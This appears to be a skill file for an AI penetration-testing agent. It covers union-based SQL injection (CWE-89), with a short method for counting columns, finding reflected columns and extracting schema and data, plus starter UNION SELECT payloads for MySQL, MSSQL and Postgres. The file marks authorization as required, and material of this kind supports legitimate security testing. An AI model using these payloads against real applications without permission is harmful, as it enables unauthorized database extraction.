---
name: union-based-sqli
description: >-
  Exploit SQL injection where query results are rendered in the response, using UNION SELECT
  to append attacker-chosen columns (CWE-89). Invoke when the injectable query's output is
  displayed and you can match column count/types. Fastest bulk-extraction path when available;
  falls back to blind if output isn't reflected.
family: 04-injection
type: exploit
owasp: [A03:2021]
cwe: [CWE-89]
requires: [tech-fingerprint]
authorization: required
---

# Union-Based SQLi

## Invoke when
- The vulnerable query's rows appear in the response (a table/list/detail view).

## Prerequisites & oracle
- Oracle = your UNION-appended row appears in the rendered output.

## Methodology
1. Determine column count: `ORDER BY n` until error, or `UNION SELECT NULL,NULL,...`.
2. Find a text-compatible column (place a marker string).
3. Replace markers with data expressions (version, current_user, schema queries).
4. Enumerate schema then extract target data via the reflected column(s).

## Starter payloads
- `' ORDER BY 5-- -` ; `' UNION SELECT NULL,@@version,NULL-- -` (MySQL/MSSQL)
- Postgres string cast: `' UNION SELECT NULL,version()::text,NULL-- -`
- Schema (MySQL): `' UNION SELECT table_name,column_name,NULL FROM information_schema.columns-- -`

## False-positive filters
- Column-count/type mismatch throws errors that look like WAF blocks — adjust NULL count/types first.
